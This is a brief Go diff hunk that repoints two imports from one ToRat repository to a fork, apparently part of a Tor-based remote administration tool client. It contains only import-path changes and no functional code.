@@ -6,8 +6,8 @@ import (
 	"os"
 	"path/filepath"
 
-	"github.com/lu4p/ToRat/shared"
-	"github.com/lu4p/ToRat/torat_client/crypto"
+	"github.com/JustinTimperio/ToRat/shared"
+	"github.com/JustinTimperio/ToRat/torat_client/crypto"
 	"github.com/lu4p/shred"
 )
 
